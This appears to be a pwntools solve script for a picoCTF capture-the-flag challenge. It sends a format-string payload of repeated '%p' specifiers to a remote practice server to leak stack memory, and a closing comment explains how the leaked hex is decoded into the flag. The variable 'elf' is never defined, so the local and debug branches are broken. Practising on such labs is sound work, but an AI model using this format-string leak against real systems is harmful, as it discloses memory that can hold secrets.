#!/usr/bin/env python3

from pwn import *

gs = '''
init-pwndbg
continue
'''

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("mercury.picoctf.net", 53437)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    io.sendlineafter(b'portfolio', b'1')
    io.sendlineafter(b'?', b'%p'*100)

    io.interactive()

if __name__ == "__main__":
    main()

# Use cyberchef to decode from hex and reverse the charaters and then in reversed four byte sequence we get the flag.
